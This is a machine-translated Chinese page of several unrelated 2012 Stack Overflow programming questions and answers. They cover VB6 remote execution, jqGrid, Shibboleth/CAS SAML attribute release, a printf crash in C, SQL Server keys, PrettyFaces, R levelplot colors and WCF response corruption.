```
var testvar = $('div#home').css("visibility"); 
```

# vb6 - 在vb6中从客户端执行服务器中的exe

> ID：13418590
> 
> 赞同：0
> 
> 时间：2012-11-16T14:29:36.323
> 
> 标签：vb6, client, exe, execution

我有一个连接到开发服务器的终端服务器。

在我的开发服务器中有一个共享文件夹，其中包含许多“.exe”文件。

我想要的是我的终端服务器上有权访问该共享文件夹的任何终端都应该能够启动“.exe”文件。

但是这些“.exe”文件不能在终端服务器上运行。这些“.exe”文件需要在我的开发服务器中工作。

出于这个原因，我试图创建一个执行器来执行我在我的开发服务器中定义的“.exe”文件。我如何在 vb6 中实现这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T17:24:59.150

如果我理解你的问题，我想你会想要看起来像这样的代码

```
Sub Main()

    Dim objWSShell As Object
    Set objWSShell = CreateObject("Wscript.Shell")
    objWSShell.Run Command$, 0, True

End Sub 
```

你会用你想作为参数运行的 exe 来调用你的 exe：

`MyAppRunner MyAppToRun.exe`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T21:53:57.853

如果程序需要在第二个“开发”服务器上运行，如果您想要交互，则需要 RDP 到该服务器。

您唯一能做的就是将它们分成客户端和服务器，然后在终端服务器上运行客户端。这些客户端将使用 DCOM、Web 服务等作为两者之间的粘合剂。

一个例外可能是编写为命令行或无 UI 批处理程序的程序，这在大多数 VB6 使用中相当罕见。这些可以通过 Telnet 到第二台服务器或远程执行来运行。没有必要详细说明这一点，因为它更不可能满足您的需求。如果您确实*是*指批处理/非交互式程序，请查看使用 WSH 的远程脚本。

# jquery - Asp.Net Mvc JqGrid 动态列名？

> ID：13418591
> 
> 赞同：1
> 
> 时间：2012-11-16T14:29:40.270
> 
> 标签：jquery, asp.net-mvc, json, asp.net-mvc-4, jqgrid

我是 JqGrid 的新手。我使用以下代码来网格化我的数据：

```
<script type="text/javascript">
jQuery(document).ready(function () {
    jQuery("#grid_table").jqGrid({
        url: '@Url.Action("GetAll", "Widget")',
        datatype: "json",
        mtype: 'POST',
        colNames: ['ReadDate', 'Name'],
        colModel: [
            { name: 'ReadDate', index: 'ReadDate', width: 200, sortable: true, editable: false, editoptions: { readonly: true, size: 10} },
            { name: 'Name', index: 'Name', width: 500, editable: false }
       ],
        jsonReader: {
            root: "rows", //array containing actual data
            page: "page", //current page
            total: "total", //total pages for the query
            records: "records", //total number of records
            repeatitems: false,
            id: "id" //index of the column with the PK in it
        },
        rowNum: 20,
        rowList: [20, 30],
        pager: jQuery('#gridpager'),
        sortname: 'Name',
        viewrecords: true,
        sortorder: "asc",
        width:968,
        height:349
    }).navGrid('#gridpager');
});
</script> 
```

代码有效。我无法使用 json 从服务器获取数据。但我也想动态获取 colNames。我找不到有关此主题的任何文档。如何动态获取 colNames 和 colModels？

像这样的东西：

```
colNames: data.colNames,
colModel: data.colModels, 
```

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T14:44:08.457

你可以这样做，但你可能不值得。您放入 colModels 的数据还必须包含这些列的所有表示逻辑，例如大小、可编辑等。

如果您认为您可以始终如一地从您的属性中计算出所有这些选项，那么它可能会起作用，但是如果不稍微自定义外观，就很难获得适合各种数据的美观网格。您将返回您的 poco 序列化为适合 jqgrid 模式的 json。

我个人的意见是原样离开，或者考虑购买另一个网格，比如从 Telerik 或 rad 控制。确实考虑一下你是否想要一个网格。

两篇文章可能会帮助您使用 asp.net-mvc 动态创建网格

[http://www.codeproject.com/Articles/421189/jqGrid-MVC-Html-Helper](http://www.codeproject.com/Articles/421189/jqGrid-MVC-Html-Helper)

[http://www.codeproject.com/Articles/424640/ASP-NET-MVC-HTML-Helper-for-the-jqGrid](http://www.codeproject.com/Articles/424640/ASP-NET-MVC-HTML-Helper-for-the-jqGrid)

# attributes - CAS 和 Shibboleth 集成将主体名称（用户名）作为 SAML 中的属性发布

> ID：13418596
> 
> 赞同：3
> 
> 时间：2012-11-16T14:30:01.003
> 
> 标签：attributes, saml, cas, saml-2.0, shibboleth

我觉得我已经在高处和低处搜索了应该是一个简单的配置：并且空无一物。

我对 Shibboleth 完全陌生，虽然我曾与 CAS 合作过一点，但没有什么太紧张的。我已经设置了它（按照以下指南：[https](https://wiki.jasig.org/display/CASUM/Shibboleth-CAS+Integration) ://wiki.jasig.org/display/CASUM/Shibboleth-CAS+Integration ），以便 Shibboleth 重定向到 CAS 进行身份验证。这很好用，一旦用户通过身份验证，他们就会通过 Shibboleth 重定向，并发送 SAML 响应。我正在使用[https://sp.testshib.org](https://sp.testshib.org)进行测试，它正在正确接收响应并显示页面。

我似乎无法弄清楚如何使用用于登录 CAS 的用户名发布一个简单的属性。我知道 Shibboleth 看到了它（来自 idp-process.log），但我不知道在 attribute-resolver.xml 和 attribute-filter.xml 中放什么来释放它。

当前的 SAML 响应如下所示：

```
<?xml version="1.0" encoding="UTF-8"?><saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" ID="_da56752846e00c2693ece2c486d7c870" IssueInstant="2012-11-16T14:08:07.570Z" Version="2.0">
   <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://<idpurl>/idp/shibboleth</saml2:Issuer>
   <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
         <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
         <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
         <ds:Reference URI="#_da56752846e00c2693ece2c486d7c870">
            <ds:Transforms>
               <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
               <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
            </ds:Transforms>
            <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
            <ds:DigestValue>7OHKEiEQ0ZcPDcnt4B8PIGoLEfw=</ds:DigestValue>
         </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>S3FZI+KpNf8wUYWMA96ccAj0Y5ebojB1xKHlixHWNEr4voqHOGSpBzxdui0IVtUwLEzj4RrDFdYarJaZj6ltzFV4hfNx5bN88zYQG6w9BBP9UybG+81Wrhii2O31AmRz2Y6XIqa72CeN2R4DKo70awn6FXIPLAcEKs+7dAG2lQ87VS3Wv126DghE/eGcMLW6+z9a3MxXtUFSmWYosaIbNREJn4mGO/uGzD27eeo6SNmvBx/BgVh7T2cOIbtD8b9OOZT8Urt0kZ2nsoCZHgp1T0V6ZgnE2TDvPTInrxzC5c4S+YOYZlB0ijMI6pk+PpJGshe7MVUcEO34Nn0I3i0OUw==</ds:SignatureValue>
      <ds:KeyInfo>
         <ds:X509Data>
            <ds:X509Certificate><!--Valid Certificate--></ds:X509Certificate>
         </ds:X509Data>
      </ds:KeyInfo>
   </ds:Signature>
   <saml2:Subject>
      <saml2:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient" NameQualifier="https://<idpurl>/idp/shibboleth" SPNameQualifier="https://sp.testshib.org/shibboleth-sp">_4b1a2780b2ce3db36ea7e7f6192b7108</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
         <saml2:SubjectConfirmationData Address="<valid ip address>" InResponseTo="_aa4e23dd783eddb1be18ad224c26e7cf" NotOnOrAfter="2012-11-16T14:13:07.570Z" Recipient="https://sp.testshib.org/Shibboleth.sso/SAML2/POST"/>
      </saml2:SubjectConfirmation>
   </saml2:Subject>
   <saml2:Conditions NotBefore="2012-11-16T14:08:07.570Z" NotOnOrAfter="2012-11-16T14:13:07.570Z">
      <saml2:AudienceRestriction>
         <saml2:Audience>https://sp.testshib.org/shibboleth-sp</saml2:Audience>
      </saml2:AudienceRestriction>
   </saml2:Conditions>
   <saml2:AuthnStatement AuthnInstant="2012-11-16T14:08:07.554Z" SessionIndex="00568a153d3cccf9c17abf2c77a043ed8b74a74fe5e2c61000590269aa87f99a">
      <saml2:SubjectLocality Address="<valid ip address>"/>
      <saml2:AuthnContext>
         <saml2:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
      </saml2:AuthnContext>
   </saml2:AuthnStatement>
</saml2:Assertion> 
```

我只需要一个如何进行此设置的示例。我已经阅读了 wiki.shibboleth.net 上的所有文档，但似乎仍然无法理解。

非常感谢您的帮助，我知道这只是一个配置问题，但它让我的大脑感到愚蠢，我什至没有尝试与比 TestShib 更激烈的东西集成！

编辑：我发现这个设置指南有部分帮助，我可以通过搜索活动目录将名称作为属性传递，但这不是一个合适的长期解决方案，因为 CAS 可以检查多个用户存储库，它不一定是同一个，这将检查得到它。我只想将 ${requestContext.principalName} 作为属性发布。

有更好的想法吗？也许是一个静态连接器，但我不确定如何让它解决 ${requestContext.principalName}？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-23T22:02:09.343

最后，我能够弄清楚。在这里为遇到此问题并迷失在本应简单的细节沼泽中的任何其他人发布解决方案。

在 Shibboleth 的 attribute-resolver.xml 文件中，我必须添加以下解析器：

```
<resolver:AttributeDefinition id="principal" xsi:type="PrincipalName" xmlns="urn:mace:shibboleth:2.0:resolver:ad">

    <resolver:AttributeEncoder
        xsi:type="SAML1String"
        xmlns="urn:mace:shibboleth:2.0:attribute:encoder"
        name="urn:mace:dir:attribute-def:principal" />

    <resolver:AttributeEncoder
        xsi:type="SAML2String"
        xmlns="urn:mace:shibboleth:2.0:attribute:encoder"
        name="urn:oid:1.3.6.1.4.1.5923.1.1.1.1"
        friendlyName="principal" />

</resolver:AttributeDefinition> 
```

在 attribute-filter.xml 我需要添加以下过滤器：

```
 <AttributeFilterPolicy id="releaseBasicAttributesToAnyone">
        <PolicyRequirementRule xsi:type="basic:ANY"/>
        <AttributeRule attributeID="principal">
                <PermitValueRule xsi:type="basic:ANY" />
        </AttributeRule>
    </AttributeFilterPolicy> 
```

如果您不想将主体释放给每个 SP，请更改您的策略要求规则。

令人惊讶的是，如此简单的事情似乎在任何地方都没有清楚地记录在案。我浏览了 shibboleth 文档的时间比这本应该花的时间长，最后在 google 群组帖子中找到了线索，该帖子有人提出要更改 PrincipalName 的值。

我希望这对其他人有帮助！

# printf - 子函数中的 printf 访问冲突 - Ansi C90

> ID：13418598
> 
> 赞同：0
> 
> 时间：2012-11-16T14:30:02.650
> 
> 标签：printf, access-violation, ansi, c89

在子函数中调用 printf 会导致访问冲突。

该程序的规模相当大。但我能够将问题隔离到只进行子函数调用的地步。

我可以通过使用如下文字常量调用 printf 来使系统崩溃：printf("test")。其他一些人也通过给 printf 一个奇怪的对象来访问违规 - 这里不是这种情况。

这是一些伪代码：

```
subfunction()
{
    printf("all works great"); //Access Violation

    //some other calls here
}

void main()
{
    otherfunctions(); //
    printf("all works great");
    subfunction();        
    //some more calls here
} 
```

从我的 stachtrace 中：

```
msvcr100d.dll!_chkstk()
msvcr100d.dll!_write(int fh, const void * buf, unsigned int cnt)
msvcr100d.dll!_flush(_iobuf * str)
msvcr100d.dll!_ftbuf(int flag, _iobuf * str)
msvcr100d.dll!printf(const char * format, ...) 
```

该代码是 C90 代码，并使用 VS2010 编译。它应该被视为C90。它发生在重构之后，所有 _(v)snprintf 都被替换为它们的 _(v)snprintf_s 对应物。我不确定这是否有影响。

我认为缓冲区在写入任何内容之前就被刷新了。

我该如何进一步调查？我的其他代码可以触及哪些系统设置以使 printf 像那样崩溃？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-13T09:19:42.357

错误是我希望 printf 打印一个字符串，但实际上传递了一个非字符串给它。

对于 Ansi-C，我通常会编写一个结构来封装字符串。

```
typedef struct TString{
    char buffer[2000];
}TString; 
```

我倾向于写：

```
void mistake( void ){
    TString str;
    TStrnig_Construct(&str);
    prtinf( "%s", str );
    TString_Destuct(&str);
} 
```

这对我来说很难发现，因为它看起来真的像 str 是一个字符串。实际上 str 不是字符串而是结构。这个错误可以在任何地方出现，尤其是当结构的内容被其他信息（例如`size_t size`）扩展时。

我应该写：

```
void corrected( void ){
    TString str;
    TStrnig_Construct(&str);
    prtinf( "%s", str.buffer );
    TString_Destuct(&str);
} 
```

# sql-server - 用于插入的 SQL Server IQID 键

> ID：13418599
> 
> 赞同：1
> 
> 时间：2012-11-16T14:30:07.290
> 
> 标签：sql-server

我的系统中有下表：

```
SET ANSI_NULLS ON
GO

SET QUOTED_IDENTIFIER ON
GO

SET ANSI_PADDING ON
GO

CREATE TABLE [dbo].[VCMANAGER](
    [IQID] [char](32) NOT NULL,
    [ACCOUNT] [char](32) NULL,
    [FUND] [char](32) NULL,
    [GROUPINVEST] [char](32) NULL,
    [PORTFOLIO] [char](32) NULL,
    [PROJECT] [char](32) NULL,
    [PRJGUARANTEE] [char](32) NULL,
    [KIND] [nvarchar](15) NULL,
    [MANAGERROLE] [nvarchar](15) NULL,
    [INFORMATIONS] [nvarchar](254) NULL,
    [STARTDATE] [datetime] NULL,
    [ENDDATE] [datetime] NULL,
    [PARTNER] [char](32) NULL,
    [DISPLAYINDEX] [int] NULL,
 CONSTRAINT [PK_VCMANAGER] PRIMARY KEY CLUSTERED 
(
    [IQID] ASC
)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]
) ON [PRIMARY]

GO

SET ANSI_PADDING OFF
GO 
```

问题：如何创建一个`ID`以将值插入此表中？（什么去哪里？？？在哪里？）

```
insert into VCMANAGER(IQID, ACCOUNT, KIND, PARTNER)     
   select 
      ???, account, 'COLEAD', 'F817090E50AD41F4BF2F7AA55262D6B7' 
   from 
      #rainer 
   where  
      colead is null 
```

感谢您的回答！

干杯，马库斯

# jsf - 奇怪的 JSF PrettyFaces 异常

> ID：13418603
> 
> 赞同：0
> 
> 时间：2012-11-16T14:30:15.557
> 
> 标签：jsf, jsf-2, jboss, mojarra, prettyfaces

嗨，我不时遇到异常（无法重现）并且不知道该怎么办..

这是堆栈跟踪：

```
java.lang.NumberFormatException.forInputString 13:46:52,015 ERROR [org.apache.catalina.core.ContainerBase.[jboss.web].[atlasvirtualdomain].[/].[Faces Servlet]] (http--0.0.0.0-8040-399) Servlet.service() for servlet Faces Servlet threw exception: java.lang.NumberFormatException: For input string: "+O.undefined"
    at java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) [rt.jar:1.7.0_07]
    at java.lang.Integer.parseInt(Integer.java:492) [rt.jar:1.7.0_07]
    at java.lang.Integer.valueOf(Integer.java:582) [rt.jar:1.7.0_07]
    at javax.faces.convert.IntegerConverter.getAsObject(IntegerConverter.java:116) [jboss-jsf-api_2.1_spec-2.0.1.Final.jar:2.0.1.Final]
    at com.ocpsoft.pretty.faces.beans.ParameterInjector.injectPathParams(ParameterInjector.java:85) [prettyfaces-jsf2-3.3.3.jar:]
    at com.ocpsoft.pretty.faces.beans.ParameterInjector.injectParameters(ParameterInjector.java:54) [prettyfaces-jsf2-3.3.3.jar:]
    at com.ocpsoft.pretty.faces.event.PrettyPhaseListener.afterPhase(PrettyPhaseListener.java:102) [prettyfaces-jsf2-3.3.3.jar:]
    at com.sun.faces.lifecycle.Phase.handleAfterPhase(Phase.java:189) [jsf-impl-2.1.7-jbossorg-2.jar:]
    at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:107) [jsf-impl-2.1.7-jbossorg-2.jar:]
    at com.sun.faces.lifecycle.RestoreViewPhase.doPhase(RestoreViewPhase.java:116) [jsf-impl-2.1.7-jbossorg-2.jar:]
    at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:118) [jsf-impl-2.1.7-jbossorg-2.jar:]
    at org.apache.myfaces.extensions.cdi.jsf2.impl.listener.phase.CodiLifecycleWrapper.execute(CodiLifecycleWrapper.java:95) [myfaces-extcdi-bundle-jsf20-1.0.5.jar:1.0.5]
    at javax.faces.webapp.FacesServlet.service(FacesServlet.java:593) [jboss-jsf-api_2.1_spec-2.0.1.Final.jar:2.0.1.Final]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:329) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at org.primefaces.webapp.filter.FileUploadFilter.doFilter(FileUploadFilter.java:82) [classes:]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:280) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at utils.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:32) [classes:]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:280) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at com.ocpsoft.pretty.PrettyFilter.doFilter(PrettyFilter.java:145) [prettyfaces-jsf2-3.3.3.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:280) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at utils.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:32) [classes:]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:280) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:840) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:622) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:560) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:488) [jbossweb-7.0.13.Final.jar:]
    at com.ocpsoft.pretty.PrettyFilter.doFilter(PrettyFilter.java:137) [prettyfaces-jsf2-3.3.3.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:280) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at utils.CharacterEncodingFilter.doFilter(CharacterEncodingFilter.java:32) [classes:]
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:280) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:248) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:275) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:161) [jbossweb-7.0.13.Final.jar:]
    at org.jboss.as.jpa.interceptor.WebNonTxEmCloserValve.invoke(WebNonTxEmCloserValve.java:50) [jboss-as-jpa-7.1.1.Final.jar:7.1.1.Final]
    at org.jboss.as.web.security.SecurityContextAssociationValve.invoke(SecurityContextAssociationValve.java:153) [jboss-as-web-7.1.1.Final.jar:7.1.1.Final]
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:155) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102) [jbossweb-7.0.13.Final.jar:]
    at org.jboss.web.rewrite.RewriteValve.invoke(RewriteValve.java:466) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109) [jbossweb-7.0.13.Final.jar:]
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:368) [jbossweb-7.0.13.Final.jar:]
    at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:877) [jbossweb-7.0.13.Final.jar:]
    at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:671) [jbossweb-7.0.13.Final.jar:]
    at org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:930) [jbossweb-7.0.13.Final.jar:]
    at java.lang.Thread.run(Thread.java:722) [rt.jar:1.7.0_07] 
```

我猜漂亮脸蛋与此有关：

```
at com.ocpsoft.pretty.faces.beans.ParameterInjector.injectPathParams(ParameterInjector.java:85) [prettyfaces-jsf2-3.3.3.jar:]
at com.ocpsoft.pretty.faces.beans.ParameterInjector.injectParameters(ParameterInjector.java:54) [prettyfaces-jsf2-3.3.3.jar:]
at com.ocpsoft.pretty.faces.event.PrettyPhaseListener.afterPhase(PrettyPhaseListener.java:102) [prettyfaces-jsf2-3.3.3.jar:] 
```

我用：

*   JBoss AS 7.1
*   内置
*   莫哈拉
*   JSF 2.1
*   CODI
*   漂亮脸蛋

编辑：

我以某种方式设法修复它（见我的回答），但我不明白我的修复是如何工作的......

有时会调用此 url（在所有 cookie 被删除或从未存在之后）：

```
http://.../firsat/655/something/;jsessionid=uNCQNxYxmmuQak6bcfpfZTG-.undefined 
```

为什么 jsessionid 与我的 prettytime 规则混淆了？我...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T16:02:23.493

很难告诉您那里到底出了什么问题，但我可以帮助您了解它发生在哪个时间点。

PrettyFaces 阶段侦听器在 RESTORE_VIEW 阶段之后启动。在这个阶段 PrettyFaces 处理所有查询和路径参数。由于错误发生在 期间`ParameterInjector.injectPathParams()`，问题与某些路径参数有关。

在注入发生之前，PrettyFaces 检查参数绑定到的 bean 属性的类型。PrettyFaces 然后检查 JSF 是否为该类型注册了任何转换器。根据堆栈跟踪，该字段似乎是一个整数，因为 PrettyFaces 调用了`IntegerConverter`. 转换器用于将路径参数的值从 URL（为 String）转换为目标类型（为 int）。

例外情况是，输入字符串`+O.undefined`不能转换为整数。所以看起来这个字符串是请求的 URL 的一部分。

看看这个例子。假设您有这样的映射：

```
<url-mapping id="userDetails">
  <pattern value="/user/#{userBean.id}" />
  <view-id value="/faces/user-details.jsf" /> 
</url-mapping> 
```

如果由于某种原因有人请求 URL `/user/+O.undefined`，您将得到这个异常。所以我认为你必须找到发生这种情况的原因。也许您会在访问日志中找到线索？！？

顺便说一句：您还可以使用正则表达式来确保仅在路径参数与某个表达式匹配时才处理映射。像这样的东西：

```
<url-mapping id="userDetails">
  <pattern value="/user/#{ /[0-9]+/ userBean.id }" />
  <view-id value="/faces/user-details.jsf" /> 
</url-mapping> 
```

有关详细信息，请参阅PrettyFaces 文档中的[这一章。](http://ocpsoft.org/docs/prettyfaces/3.3.3/en-US/html/Configuration.html#config.pathparams.regex)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T16:01:55.430

该错误是使用“id”作为 url 参数的名称：

```
 <url-mapping id="articleedit2"> 
      <pattern value="/duzenle/#{id: articleEdit.article_id}/" /> 
      <view-id value="/faces/article_edit.xhtml" />
      <action>#{articleEdit.initForEdit()}</action>
  </url-mapping> 
```

然后用java重定向到id（伪代码：Redirect('something?id=123')）。不知何故 jsessionid 混入了这个参数然后......

解决方法是将其重命名为 id 以外的名称 :)

编辑：我又遇到了这个错误......仍然不知道是什么触发了它

# r - 具有 RGB 的矩阵的颜色单元

> ID：13418604
> 
> 赞同：3
> 
> 时间：2012-11-16T14:30:15.667
> 
> 标签：r, colors, matrix, lattice, self-organizing-maps

`levelplot`是否可以使用R 包中的函数绘制颜色矩阵`lattice`？我必须用`RGB`函数为每个单元格着色。

颜色矩阵必须如下所示，我需要为每个单元格着色，如 rgb(1,0.8,0.9) 等。

![颜色矩阵](../Images/fbe7405a485f2a6d6dbcd95b65257d12.png)

我需要这个，因为我必须实现`self-organizing-map`颜色分类算法。我不允许使用内置的 kohonen/som 函数或 som 类。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T12:17:33.997

看看[Murrel：（2011）R 图形中的光栅图像](http://journal.r-project.org/archive/2011-1/RJournal_2011-1_Murrell.pdf)

它很好地解释了如何在基础 R 或网格中做这些事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T22:23:21.007

这向您展示了 rgb 颜色如何在 rainbow() 的结果中编码，以及 levelplot 如何处理 col.regions 的该参数：

```
str(  rainbow(100)) 
# chr [1:100] "#FF0000FF" "#FF0F00FF" "#FF1F00FF" "#FF2E00FF" "#FF3D00FF" ... 
```

红色、绿色和蓝色参数的范围在 0 到 FF 之间，透明度值为 FF，因此这会在值范围内产生单个带：

```
levelplot(matrix(1:100, 100), region=TRUE, col.regions=rainbow(100) ) 
```

这给了你一个（可怕的）颜色矩阵：

```
levelplot(matrix(1:10000, 100), region=TRUE, col.regions=rainbow(100) ) 
```

# wcf - WCF HTTP 服务：安装 vs2012 损坏的应用程序

> ID：13418612
> 
> 赞同：3
> 
> 时间：2012-11-16T14:30:50.143
> 
> 标签：wcf, .net-4.0, .net-4.5

我有一个自托管网络服务（*WebServiceHost*），它还提供 html 网站（带有 JavaScript 文件、图像等）。该服务在 .net 4.0（带有 vs2010）中运行良好。

现在我已经安装了 vs2012 并且我的应用程序似乎坏了（仍在使用 vs2010 - 可能是安装 .net 4.5 的原因）。它编译得很好，我也没有运行时错误，但 html 和 JavaScript 在某些情况下似乎被破坏了。以下是（我认为）相关的代码片段：

**使用的接口（System.Data.Services）：**

```
public interface IRequestHandler
{
    Message ProcessRequestForMessage(Stream messageBody);
} 
```

**消息的创建：**

```
string filePath = _physicalPath + string.Join("\\", incomingRequest.UriTemplateMatch.RelativePathSegments.ToArray());
HttpResponseMessageProperty responseProperty = new HttpResponseMessageProperty();

if (File.Exists(filePath) && SetContentType(responseProperty.Headers, Path.GetExtension(filePath).ToLower()))
{
    Message message = Message.CreateMessage(MessageVersion.None, "", HttpServiceBodyWriter.Create(filePath));
    message.Properties.Add(WebBodyFormatMessageProperty.Name, new WebBodyFormatMessageProperty(WebContentFormat.Raw));
    message.Properties.Add(HttpResponseMessageProperty.Name, responseProperty);
} 
```

**HttpServiceBodyWriter：**

```
class HttpServiceBodyWriter : StreamBodyWriter
{
    private System.IO.Stream _source = null;

    private HttpServiceBodyWriter(System.IO.Stream source) : base(false)
    {
        _source = source;
    }

    protected override void OnWriteBodyContents(System.IO.Stream stream)
    {
        _source.CopyTo(stream);
    }

    internal static HttpServiceBodyWriter Create(System.Net.WebResponse response)
    {
        return new HttpServiceBodyWriter(response.GetResponseStream());
    }

    internal static HttpServiceBodyWriter Create(string filePath)
    {
        return new HttpServiceBodyWriter(File.Open(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite));
    }
} 
```

如果我请求一个 HTML 页面，这有时会提供一个损坏的页面（参见双 dtd 定义和“head”之后的空标记）：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"  "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
    <>
    ..... 
```

有时会传递正确的页面：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta charset="UTF-8" />
.... 
```

似乎初始页面请求总是提供正确的页面。后续请求损坏。

有没有人解释这种奇怪的行为？任何帮助表示赞赏（这个问题让我想起了 C++ 时代）。

这是 App.Config 的 serviceModel 部分：

```
<system.serviceModel>
  <diagnostics>
    <messageLogging logEntireMessage="true" logMalformedMessages="true" logMessagesAtServiceLevel="false" logMessagesAtTransportLevel="true" maxMessagesToLog="300000" maxSizeOfMessageToLog="200000" />
  </diagnostics>
  <services>
    <service name="WcfTest.HttpService" behaviorConfiguration="DataServiceBehavior">
      <endpoint name="DataService" binding="webHttpBinding" bindingConfiguration="DataService" contract="System.Data.Services.IRequestHandler" />
      <host>
        <baseAddresses>
          <add baseAddress="http://localhost:8080/TestSite/" />
        </baseAddresses>
      </host>
    </service>
  </services>
  <behaviors>
    <endpointBehaviors />
    <serviceBehaviors>
      <behavior name="DataServiceBehavior">
        <serviceDebug includeExceptionDetailInFaults="False" />
        <dataContractSerializer maxItemsInObjectGraph="1000000" />
        <serviceMetadata httpGetEnabled="true" />
        <serviceThrottling maxConcurrentCalls="200" maxConcurrentInstances="2147483647" maxConcurrentSessions="200" />
      </behavior>
    </serviceBehaviors>
  </behaviors>
  <bindings>
    <webHttpBinding>
      <binding name="DataService" maxReceivedMessageSize="5000000" maxBufferPoolSize="5000000" maxBufferSize="5000000" closeTimeout="00:03:00" openTimeout="00:03:00" receiveTimeout="00:10:00" sendTimeout="00:03:00">
        <readerQuotas maxStringContentLength="5000000" maxArrayLength="5000000" maxBytesPerRead="5000000" />
        <security mode="None"/>
      </binding>
    </webHttpBinding>
  </bindings>
</system.serviceModel> 
```

**更新**

我创建了一个小项目，您可以在其中重现此问题。你可以在这里下载：[https ://skydrive.live.com/redir?resid=CBC3C885DE2032B8!131&authkey=!ALZOaSL0V0s-itM](https://skydrive.live.com/redir?resid=CBC3C885DE2032B8!131&authkey=!ALZOaSL0V0s-itM)

只需按几次浏览器的刷新按钮，直到出现损坏的 html。

* * *

## 回答 #1

